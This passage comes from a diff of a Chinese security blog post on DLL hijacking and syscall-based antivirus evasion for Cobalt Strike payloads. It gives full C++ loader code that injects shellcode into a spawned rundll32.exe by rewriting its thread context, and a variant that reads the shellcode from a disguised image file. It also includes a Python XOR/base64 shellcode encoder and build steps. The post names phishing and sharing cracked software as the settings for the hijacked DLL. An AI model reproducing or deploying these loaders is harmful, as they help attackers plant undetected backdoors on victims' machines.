+<p><img src="/posts/facab1e5/image-20220829141832346.png" alt="image-20220829141832346"><br>先应用下面的才会出来<br><img src="/posts/facab1e5/image-20220829142012808.png" alt="image-20220829142012808"><br>接下来设置项目属性（注意平台以及配置要和你编译环境相同配置应该为release，平台x86就用win32 x64就用x64）<br><img src="/posts/facab1e5/image-20220829142733847.png" alt="image-20220829142733847"><br><img src="/posts/facab1e5/image-20220829142751524.png" alt="image-20220829142751524"></p>
 <p>如果发生报错:LNK2026 模块对于 SAFESEH 映像是不安全的。<br>解决方法：<br>1.打开该项目的“属性页”对话框。<br>2.单击“链接器”文件夹。<br>3.单击“命令行”属性页。<br>4.将 &#x2F;SAFESEH:NO 键入“附加选项”框中，然后点击应用。</p>
 <p>接下来要添加上线代码</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;framework.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;krpt.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">	DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">	LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>	&#123;<br>	<span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>	&#123;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> hexData[] = <span class="hljs-comment">//填入shellcode</span><br><br>		<span class="hljs-type">char</span>* v7A = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, _countof(hexData), <span class="hljs-number">0x3000</span>u, <span class="hljs-number">0x40</span>u);<br>		<span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)v7A, hexData, _countof(hexData));<br><br>		<span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PROCESS_INFORMATION</span> ProcessInformation;<br>		<span class="hljs-keyword">struct</span> <span class="hljs-title class_">_STARTUPINFOA</span> StartupInfo;<br>		<span class="hljs-type">void</span>* v24;<br>		CONTEXT Context;<br>		DWORD DwWrite = <span class="hljs-number">0</span>;<br>		<span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(StartupInfo));<br>		StartupInfo.cb = <span class="hljs-number">68</span>;<br>		BOOL result = <span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-number">0</span>, (LPSTR)<span class="hljs-string">&quot;rundll32.exe&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x44</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<br>		<span class="hljs-keyword">if</span> (result)<br>		&#123;<br>			Context.ContextFlags = <span class="hljs-number">65539</span>;<br>			<span class="hljs-built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);<br>			v24 = <span class="hljs-built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="hljs-number">0</span>, _countof(hexData), <span class="hljs-number">0x1000</span>u, <span class="hljs-number">0x40</span>u);<br>			<span class="hljs-built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);<br>			Context.Eip = (DWORD)v24;<br>			<span class="hljs-built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);<br>			<span class="hljs-built_in">ResumeThread</span>(ProcessInformation.hThread);<br>			<span class="hljs-built_in">CloseHandle</span>(ProcessInformation.hThread);<br>			result = <span class="hljs-built_in">CloseHandle</span>(ProcessInformation.hProcess);<br>		&#125;<br><br><br>		<span class="hljs-built_in">TerminateProcess</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), <span class="hljs-number">0</span>);<br>	&#125;;<br><br>	<span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>	<span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>	<span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>	<span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;krpt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">char</span> hexData[] = <span class="comment">//填入shellcode</span></span><br><span class="line"></span><br><span class="line">		<span class="type">char</span>* v7A = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, _countof(hexData), <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">		<span class="built_in">memcpy</span>((<span class="type">void</span>*)v7A, hexData, _countof(hexData));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">_PROCESS_INFORMATION</span> ProcessInformation;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">_STARTUPINFOA</span> StartupInfo;</span><br><span class="line">		<span class="type">void</span>* v24;</span><br><span class="line">		CONTEXT Context;</span><br><span class="line">		DWORD DwWrite = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(StartupInfo));</span><br><span class="line">		StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">		BOOL result = <span class="built_in">CreateProcessA</span>(<span class="number">0</span>, (LPSTR)<span class="string">&quot;rundll32.exe&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x44</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">		<span class="keyword">if</span> (result)</span><br><span class="line">		&#123;</span><br><span class="line">			Context.ContextFlags = <span class="number">65539</span>;</span><br><span class="line">			<span class="built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">			v24 = <span class="built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="number">0</span>, _countof(hexData), <span class="number">0x1000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">			<span class="built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);</span><br><span class="line">			Context.Eip = (DWORD)v24;</span><br><span class="line">			<span class="built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">			<span class="built_in">ResumeThread</span>(ProcessInformation.hThread);</span><br><span class="line">			<span class="built_in">CloseHandle</span>(ProcessInformation.hThread);</span><br><span class="line">			result = <span class="built_in">CloseHandle</span>(ProcessInformation.hProcess);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="built_in">TerminateProcess</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="number">0</span>);</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>编译生成dll命名为krpt.dll将原来的dll替换运行et.exe 成功上线</p>
 <h3 id="C-amp-C-DLL劫持-白加黑-图片分离"><a href="#C-amp-C-DLL劫持-白加黑-图片分离" class="headerlink" title="C&amp;C++-DLL劫持-白加黑-图片分离"></a>C&amp;C++-DLL劫持-白加黑-图片分离</h3><blockquote>
 <p>由于dll并不免杀可以利用图片分离来进行免杀<br>利用项目:<a target="_blank" rel="noopener" href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a></p>
 </blockquote>
 <p>使用方法</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n2</span> dkmc.py<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 dkmc.py</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">gen</span><br><span class="hljs-keyword">set</span> shellcode 这里是<span class="hljs-keyword">CS</span>的shellcode<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gen</span><br><span class="line">set shellcode 这里是CS的shellcode</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <p>接下来修改dllmain.cpp</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_DEPRECATE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;framework.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;krpt.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    &#123;<br>        FILE* fp;  <span class="hljs-comment">// 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义</span><br>        <span class="hljs-type">size_t</span> size;  <span class="hljs-comment">// 定义文件字节数变量size</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* buffer;  <span class="hljs-comment">// 定义缓存指针变量</span><br><br>        fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;shell.bmp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);	<span class="hljs-comment">//****修改为上方生成的图片****</span><br>        <span class="hljs-comment">// fseek()负号前移，正号后移</span><br>        <span class="hljs-built_in">fseek</span>(fp, <span class="hljs-number">0</span>, SEEK_END);          <span class="hljs-comment">// 文件指针指向文件末尾</span><br>        <span class="hljs-comment">// ftell()返回给定流 stream 的当前文件位置</span><br>        size = <span class="hljs-built_in">ftell</span>(fp);                <span class="hljs-comment">// size值为文件大小</span><br>        <span class="hljs-built_in">fseek</span>(fp, <span class="hljs-number">0</span>, SEEK_SET);          <span class="hljs-comment">// 文件指针指向文件开头</span><br>        buffer = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);    <span class="hljs-comment">// 动态申请图片大小的内存空间（数组指针）</span><br>        <span class="hljs-built_in">fread</span>(buffer, size, <span class="hljs-number">1</span>, fp);  <span class="hljs-comment">// 从fp读取和显示1个size大小的数据</span><br><br>        <span class="hljs-type">char</span>* v7A = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, size, <span class="hljs-number">0x3000</span>u, <span class="hljs-number">0x40</span>u);<br>        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)v7A, buffer, size);<br><br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PROCESS_INFORMATION</span> ProcessInformation;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_STARTUPINFOA</span> StartupInfo;<br>        <span class="hljs-type">void</span>* v24;<br>        CONTEXT Context;<br>        DWORD DwWrite = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(StartupInfo));<br>        StartupInfo.cb = <span class="hljs-number">68</span>;<br>        BOOL result = <span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-number">0</span>, (LPSTR)<span class="hljs-string">&quot;rundll32.exe&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x44</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            Context.ContextFlags = <span class="hljs-number">65539</span>;<br>            <span class="hljs-built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);<br>            v24 = <span class="hljs-built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="hljs-number">0</span>, size, <span class="hljs-number">0x1000</span>u, <span class="hljs-number">0x40</span>u);<br>            <span class="hljs-built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, size, &amp;DwWrite);<br>            Context.Eip = (DWORD)v24;<br>            <span class="hljs-built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);<br>            <span class="hljs-built_in">ResumeThread</span>(ProcessInformation.hThread);<br>            <span class="hljs-built_in">CloseHandle</span>(ProcessInformation.hThread);<br>            result = <span class="hljs-built_in">CloseHandle</span>(ProcessInformation.hProcess);<br>        &#125;<br><br><br>        <span class="hljs-built_in">TerminateProcess</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), <span class="hljs-number">0</span>);<br>    &#125;;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;krpt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        FILE* fp;  <span class="comment">// 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义</span></span><br><span class="line">        <span class="type">size_t</span> size;  <span class="comment">// 定义文件字节数变量size</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>* buffer;  <span class="comment">// 定义缓存指针变量</span></span><br><span class="line"></span><br><span class="line">        fp = <span class="built_in">fopen</span>(<span class="string">&quot;shell.bmp&quot;</span>, <span class="string">&quot;rb&quot;</span>);	<span class="comment">//****修改为上方生成的图片****</span></span><br><span class="line">        <span class="comment">// fseek()负号前移，正号后移</span></span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);          <span class="comment">// 文件指针指向文件末尾</span></span><br><span class="line">        <span class="comment">// ftell()返回给定流 stream 的当前文件位置</span></span><br><span class="line">        size = <span class="built_in">ftell</span>(fp);                <span class="comment">// size值为文件大小</span></span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);          <span class="comment">// 文件指针指向文件开头</span></span><br><span class="line">        buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(size);    <span class="comment">// 动态申请图片大小的内存空间（数组指针）</span></span><br><span class="line">        <span class="built_in">fread</span>(buffer, size, <span class="number">1</span>, fp);  <span class="comment">// 从fp读取和显示1个size大小的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* v7A = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)v7A, buffer, size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_PROCESS_INFORMATION</span> ProcessInformation;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_STARTUPINFOA</span> StartupInfo;</span><br><span class="line">        <span class="type">void</span>* v24;</span><br><span class="line">        CONTEXT Context;</span><br><span class="line">        DWORD DwWrite = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(StartupInfo));</span><br><span class="line">        StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">        BOOL result = <span class="built_in">CreateProcessA</span>(<span class="number">0</span>, (LPSTR)<span class="string">&quot;rundll32.exe&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x44</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">        <span class="keyword">if</span> (result)</span><br><span class="line">        &#123;</span><br><span class="line">            Context.ContextFlags = <span class="number">65539</span>;</span><br><span class="line">            <span class="built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">            v24 = <span class="built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="number">0</span>, size, <span class="number">0x1000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, size, &amp;DwWrite);</span><br><span class="line">            Context.Eip = (DWORD)v24;</span><br><span class="line">            <span class="built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">            <span class="built_in">ResumeThread</span>(ProcessInformation.hThread);</span><br><span class="line">            <span class="built_in">CloseHandle</span>(ProcessInformation.hThread);</span><br><span class="line">            result = <span class="built_in">CloseHandle</span>(ProcessInformation.hProcess);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">TerminateProcess</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="number">0</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>生成dll重命名为krpt.dll 和生成图片一起拖入到et.exe文件夹 运行上线</p>
 <p><strong>DLL劫持适用场景</strong><br>钓鱼，或给他人分享破解软件时 适用Dll劫持</p>
@@ -336,323 +229,362 @@
 </blockquote>
 <p>使用Syscall生成的exe文件 直接调用系统底层的函数依赖，完成上线<br>常规后门exe文件，需要调用很多系统自带的 dll 文件才能完成上线</p>
 <p>这里利用EDR-Bypass-demo项目中的demo进行测试<br><strong>demo1</strong><br>CS生成raw的shellcode<br>使用enc.py进行加密(注意加密后要把末尾的&#x3D;&#x3D;换成@@)然后填入到demo1.cpp(chapter4-demo3下)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">all</span>=f.read()<br>    array=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        array.append(i^<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#print(bytearray(array))</span><br>    <span class="hljs-built_in">print</span>(base64.b64encode(<span class="hljs-built_in">bytearray</span>(array)))<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">all</span>=f.read()</span><br><span class="line">    array=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">        array.append(i^<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#print(bytearray(array))</span></span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(<span class="built_in">bytearray</span>(array)))</span><br></pre></td></tr></table></figure>
 
 <p><strong>demo2</strong><br>EDR-Bypass-demo项目中的chapter4-demo4 直接改shellcode和上文相同 生成解决方法即可上线</p>
 
-                
-              </div>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
             
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>DLL劫持与Syscall免杀初尝试</div>
-      <div>http://example.com/posts/facab1e5/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>F4tty</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年8月29日</div>
-        </div>
-      
-      
